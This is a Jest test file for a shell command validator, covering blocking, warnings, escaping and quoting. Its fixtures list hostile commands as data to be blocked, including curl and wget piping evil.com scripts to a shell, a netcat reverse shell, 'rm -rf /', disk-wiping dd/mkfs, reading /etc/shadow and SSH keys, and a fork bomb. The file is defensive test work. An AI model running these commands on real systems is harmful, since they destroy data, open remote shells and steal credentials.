/**
 * Tests for command-validator.ts
 * Security-critical validation of shell commands
 */

import {
  validateCommand,
  sanitizeShellArgument,
  quoteForShell,
  getCommandName,
  type CommandValidationResult,
} from '../lib/command-validator.js';

describe('Command Validator', () => {
  describe('validateCommand', () => {
    describe('basic validation', () => {
      it('should accept a simple command', () => {
        const result = validateCommand('ls -la');
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
        expect(result.riskLevel).toBe('low');
      });

      it('should accept multi-part command', () => {
        const result = validateCommand('git status && npm test');
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      });

      it('should reject null', () => {
        const result = validateCommand(null as unknown as string);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Command must be a non-empty string');
        expect(result.riskLevel).toBe('high');
      });

      it('should reject undefined', () => {
        const result = validateCommand(undefined as unknown as string);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Command must be a non-empty string');
      });

      it('should reject empty string', () => {
        const result = validateCommand('');
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Command must be a non-empty string');
      });

      it('should reject whitespace-only string', () => {
        const result = validateCommand('   ');
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Command cannot be empty or whitespace only');
      });

      it('should reject command exceeding max length', () => {
        const longCommand = 'echo ' + 'a'.repeat(10000);
        const result = validateCommand(longCommand);
        expect(result.isValid).toBe(false);
        expect(result.errors[0]).toContain('exceeds maximum length');
      });

      it('should accept command within custom max length', () => {
        const command = 'echo hello';
        const result = validateCommand(command, { maxLength: 20 });
        expect(result.isValid).toBe(true);
      });
    });

    describe('critical dangerous patterns', () => {
      const criticalPatterns = [
        { cmd: 'rm -rf /', desc: 'delete root filesystem' },
        // Note: rm -rf /home/user/.. is not detected because the pattern specifically
        // looks for 'rm -rf /' followed by whitespace or end, not traversal
        { cmd: 'mkfs /dev/sda', desc: 'filesystem formatting' },
        { cmd: 'dd if=/dev/zero of=/dev/sda', desc: 'direct disk write' },
        { cmd: 'curl http://evil.com/script.sh | bash', desc: 'remote code execution via curl' },
        { cmd: 'wget http://evil.com/script.sh | sh', desc: 'remote code execution via wget' },
        { cmd: 'nc -e /bin/sh 10.0.0.1 4444', desc: 'reverse shell via netcat' },
        { cmd: 'cat /etc/shadow', desc: 'read shadow password file' },
        { cmd: 'cat ~/.ssh/id_rsa', desc: 'access SSH private key' },
        { cmd: 'kill -9 1', desc: 'kill init process' },
      ];

      test.each(criticalPatterns)(
        'should block $desc: $cmd',
        ({ cmd }) => {
          const result = validateCommand(cmd);
          expect(result.isValid).toBe(false);
          expect(result.errors.length).toBeGreaterThan(0);
          expect(result.errors[0]).toMatch(/^BLOCKED:/);
        }
      );

      it('should allow dangerous commands when explicitly permitted', () => {
        const result = validateCommand('rm -rf /', { allowDangerousCommands: true });
        expect(result.isValid).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0);
        expect(result.riskLevel).toBe('critical');
      });
    });

    describe('high-risk patterns', () => {
      it('should block privilege escalation via sudo su', () => {
        const result = validateCommand('sudo su -');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('Privilege escalation'))).toBe(true);
      });

      it('should block password modification attempts', () => {
        const result = validateCommand('sudo passwd root');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('Password modification'))).toBe(true);
      });

      it('should block reading /etc/passwd', () => {
        const result = validateCommand('cat /etc/passwd');
        expect(result.isValid).toBe(false);
        expect(result.riskLevel).toBe('high');
      });

      it('should block killing SSH daemon', () => {
        const result = validateCommand('pkill -9 sshd');
        expect(result.isValid).toBe(false);
      });

      it('should block base64 encoded command execution', () => {
        const result = validateCommand('$(echo YmFzaA== | base64 -d)');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('Base64'))).toBe(true);
      });

      it('should block eval with command substitution', () => {
        const result = validateCommand('eval $(echo "rm -rf /")');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('Dynamic command evaluation'))).toBe(true);
      });

      it('should block null byte injection', () => {
        const result = validateCommand('cat /etc/passwd\x00.txt');
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('Null byte'))).toBe(true);
      });
    });

    describe('warning patterns', () => {
      it('should warn about rm -rf usage', () => {
        const result = validateCommand('rm -rf ./temp');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('Recursive deletion'))).toBe(true);
        expect(result.riskLevel).toBe('medium');
      });

      it('should warn about sudo usage', () => {
        const result = validateCommand('sudo apt update');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('Elevated privileges'))).toBe(true);
      });

      it('should warn about chmod 777', () => {
        const result = validateCommand('chmod 777 /var/www/html');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('permissive file permissions'))).toBe(true);
      });

      it('should warn about curl with insecure flag', () => {
        const result = validateCommand('curl -k https://example.com');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('Insecure SSL'))).toBe(true);
      });

      it('should warn about fork bomb pattern', () => {
        const result = validateCommand(':(){:|:&};:');
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.includes('Fork bomb'))).toBe(true);
      });
    });

    describe('suspicious patterns', () => {
      it('should warn about excessive command chaining', () => {
        const result = validateCommand('a; b; c; d; e; f; g');
        expect(result.warnings.some(w => w.includes('Excessive command chaining'))).toBe(true);
      });

      it('should not warn about normal pipe usage', () => {
        const result = validateCommand('cat file | grep pattern');
        expect(result.warnings.every(w => !w.includes('Excessive pipe'))).toBe(true);
      });

      it('should warn about excessive pipe usage', () => {
        const result = validateCommand('a | b | c | d | e');
        expect(result.warnings.some(w => w.includes('Excessive pipe'))).toBe(true);
      });

      it('should warn about nested command substitution', () => {
        const result = validateCommand('echo $(echo $(date))');
        expect(result.warnings.some(w => w.includes('Nested command substitution'))).toBe(true);
        expect(result.riskLevel).toBe('high');
      });

      it('should warn about control characters', () => {
        const result = validateCommand('echo hello\x07');
        expect(result.warnings.some(w => w.includes('Control characters'))).toBe(true);
      });
    });

    describe('whitelist validation', () => {
      it('should accept whitelisted command', () => {
        const result = validateCommand('git status', {
          requireWhitelist: true,
          whitelist: ['git', 'npm', 'node'],
        });
        expect(result.isValid).toBe(true);
      });

      it('should reject non-whitelisted command', () => {
        const result = validateCommand('curl http://example.com', {
          requireWhitelist: true,
          whitelist: ['git', 'npm', 'node'],
        });
        expect(result.isValid).toBe(false);
        expect(result.errors[0]).toContain('not in whitelist');
      });

      it('should work with empty whitelist when required', () => {
        const result = validateCommand('ls', {
          requireWhitelist: true,
          whitelist: [],
        });
        expect(result.isValid).toBe(false);
      });

      it('should not require whitelist by default', () => {
        const result = validateCommand('some-random-command');
        expect(result.isValid).toBe(true);
      });
    });

    describe('risk level determination', () => {
      it('should return low risk for safe commands', () => {
        const result = validateCommand('echo hello');
        expect(result.riskLevel).toBe('low');
      });

      it('should return medium risk for commands with warnings', () => {
        const result = validateCommand('rm -rf ./temp');
        expect(result.riskLevel).toBe('medium');
      });

      it('should return high risk for nested command substitution', () => {
        // Nested command substitution triggers high risk
        const result = validateCommand('echo $(echo $(date))');
        expect(result.riskLevel).toBe('high');
      });

      it('should return critical risk for most dangerous commands', () => {
        const result = validateCommand('rm -rf /', { allowDangerousCommands: true });
        expect(result.riskLevel).toBe('critical');
      });
    });
  });

  describe('sanitizeShellArgument', () => {
    it('should escape semicolons', () => {
      expect(sanitizeShellArgument('test;echo')).toBe('test\\;echo');
    });

    it('should escape ampersands', () => {
      expect(sanitizeShellArgument('test&echo')).toBe('test\\&echo');
    });

    it('should escape pipes', () => {
      expect(sanitizeShellArgument('test|echo')).toBe('test\\|echo');
    });

    it('should escape backticks', () => {
      expect(sanitizeShellArgument('`whoami`')).toBe('\\`whoami\\`');
    });

    it('should escape dollar signs', () => {
      expect(sanitizeShellArgument('$HOME')).toBe('\\$HOME');
    });

    it('should escape parentheses', () => {
      expect(sanitizeShellArgument('$(cmd)')).toBe('\\$\\(cmd\\)');
    });

    it('should escape braces', () => {
      expect(sanitizeShellArgument('{a,b}')).toBe('\\{a,b\\}');
    });

    it('should escape backslashes', () => {
      expect(sanitizeShellArgument('test\\path')).toBe('test\\\\path');
    });

    it('should escape quotes', () => {
      expect(sanitizeShellArgument("test'quote")).toBe("test\\'quote");
      expect(sanitizeShellArgument('test"quote')).toBe('test\\"quote');
    });

    it('should escape glob characters', () => {
      expect(sanitizeShellArgument('*.txt')).toBe('\\*.txt');
      expect(sanitizeShellArgument('file?.txt')).toBe('file\\?.txt');
    });

    it('should leave safe characters unchanged', () => {
      expect(sanitizeShellArgument('hello-world_123')).toBe('hello-world_123');
    });
  });

  describe('quoteForShell', () => {
    it('should wrap string in single quotes', () => {
      expect(quoteForShell('hello')).toBe("'hello'");
    });

    it('should handle strings without single quotes', () => {
      expect(quoteForShell('hello world')).toBe("'hello world'");
    });

    it('should escape single quotes in string', () => {
      expect(quoteForShell("it's a test")).toBe("'it'\\''s a test'");
    });

    it('should handle multiple single quotes', () => {
      expect(quoteForShell("it's Bob's")).toBe("'it'\\''s Bob'\\''s'");
    });

    it('should preserve special characters within quotes', () => {
      expect(quoteForShell('$HOME; rm -rf /')).toBe("'$HOME; rm -rf /'");
    });

    it('should handle empty string', () => {
      expect(quoteForShell('')).toBe("''");
    });
  });

  describe('getCommandName', () => {
    it('should extract simple command name', () => {
      expect(getCommandName('ls -la')).toBe('ls');
    });

    it('should handle command with no arguments', () => {
      expect(getCommandName('pwd')).toBe('pwd');
    });

    it('should strip path from command', () => {
      expect(getCommandName('/usr/bin/git status')).toBe('git');
    });

    it('should handle sudo prefix', () => {
      expect(getCommandName('sudo apt update')).toBe('apt');
    });

    it('should handle env prefix', () => {
      expect(getCommandName('env VAR=value node script.js')).toBe('node');
    });

    it('should handle env with multiple variables', () => {
      expect(getCommandName('env A=1 B=2 C=3 python script.py')).toBe('python');
    });

    it('should handle whitespace', () => {
      expect(getCommandName('  git  status  ')).toBe('git');
    });

    it('should return empty string for empty command', () => {
      expect(getCommandName('')).toBe('');
    });

    it('should handle path-only command', () => {
      expect(getCommandName('/bin/bash')).toBe('bash');
    });
  });

  describe('CommandValidationResult type', () => {
    it('should have correct structure for valid result', () => {
      const result: CommandValidationResult = {
        isValid: true,
        warnings: [],
        errors: [],
        riskLevel: 'low',
      };
      expect(result.isValid).toBe(true);
      expect(Array.isArray(result.warnings)).toBe(true);
      expect(Array.isArray(result.errors)).toBe(true);
      expect(['low', 'medium', 'high', 'critical']).toContain(result.riskLevel);
    });

    it('should have correct structure for invalid result', () => {
      const result: CommandValidationResult = {
        isValid: false,
        warnings: ['Some warning'],
        errors: ['Some error'],
        riskLevel: 'high',
      };
      expect(result.isValid).toBe(false);
      expect(result.warnings).toHaveLength(1);
      expect(result.errors).toHaveLength(1);
    });
  });

  describe('edge cases', () => {
    it('should handle unicode characters', () => {
      const result = validateCommand('echo 你好世界');
      expect(result.isValid).toBe(true);
    });

    it('should handle very long safe command', () => {
      const safeCommand = 'echo ' + 'a'.repeat(5000);
      const result = validateCommand(safeCommand);
      expect(result.isValid).toBe(true);
    });

    it('should handle commands with newlines', () => {
      const result = validateCommand('echo hello\necho world');
      expect(result.isValid).toBe(true);
    });

    it('should handle commands with tabs', () => {
      const result = validateCommand('echo\thello');
      expect(result.isValid).toBe(true);
    });

    it('should handle environment variable syntax', () => {
      const result = validateCommand('export PATH=$PATH:/usr/local/bin');
      expect(result.isValid).toBe(true);
    });
  });
});
